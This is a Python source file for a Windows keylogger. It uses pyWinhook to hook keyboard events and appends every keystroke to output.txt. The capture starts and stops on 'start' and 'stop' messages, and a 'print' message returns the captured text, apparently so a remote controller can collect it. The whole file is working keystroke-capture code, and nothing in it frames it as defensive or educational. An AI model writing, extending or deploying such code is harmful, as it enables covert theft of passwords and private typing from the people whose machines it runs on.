import os
import pythoncom, pyWinhook
import threading
import time
import sys
lock = threading.Lock()
class Keylogger:
    def __init__(self):
        self.action = False
        self.state = ""
        self.hm = pyWinhook.HookManager()
    
    def setState(self, state):
        self.state = state
    
    def getState(self):
        return self.state
    
    def getAction(self):
        return self.action
    
    def OnKeyboardEvent(self, event):
        if os.path.isfile('output.txt') == False:
            f = open('output.txt', 'w')
            f.close()
        print(event.Ascii)
        if self.action == False:
            return
        if event.Ascii !=0 or 8:
            f = open('output.txt', 'r+')
            buffer = f.read()
            f.close()
            f = open('output.txt', 'w')
            Listener = chr(event.Ascii)
            if event.Ascii == 13:
                Listener = '/n'
            buffer += Listener
            f.write(buffer)
            f.close()
            
    def startWrite(self):
        state = self.state
        if "start".lower() in state.lower() and self.action == False:
            open('output.txt', 'w')
            self.action = True
            self.hm.KeyDown= self.OnKeyboardEvent
            self.hm.HookKeyboard()
            pythoncom.PumpMessages()
        elif "stop".lower() in state.lower() and self.action == False:
            return
        time.sleep(2)

    def stopKey(self):
        while True:
            state = self.state
            if "stop".lower() in state.lower() and self.action == True:
                self.action = False
                self.hm.UnhookKeyboard()
                return
            time.sleep(1)

    def runKeylogger(self):
        threading.Thread(target=self.stopKey).start()
        threading.Thread(target=self.startWrite).start()

keylogger =  Keylogger()
def RunKeylogger(rawMsg : str):
    global keylogger
    print("khanh day:",rawMsg)
    rawMsg = str(rawMsg)
    res = "1"
    try:
        if "start".lower() not in rawMsg.lower()  and  "stop".lower() not in rawMsg.lower() and  "print".lower() not in rawMsg.lower():
            res = "BODY IS NOT VALID"
        if "start".lower() in rawMsg.lower() or  "stop".lower() in rawMsg.lower():
            keylogger.setState(rawMsg)
        if "start".lower() in rawMsg.lower() and keylogger.getAction() == False:
            keylogger.runKeylogger()
        if "print".lower() in rawMsg.lower() :
            res = printKeylogger("output.txt")
        return ["1", res]
    except:
        return ["0","0"]

def printKeylogger(filename):
    Buffer = ""
    with open(filename,"r") as f:
        k = f.readlines()
    for line in k:
        Buffer += line
    return Buffer

# if __name__ == '__main__':
#     while True:
#         f =  open("text.txt","r")
#         k = f.readline()
#         res = RunKeylogger(k)
#         print(res)
#         os.system('cls')
#         print(res)
#         f.close()
#         time.sleep(3)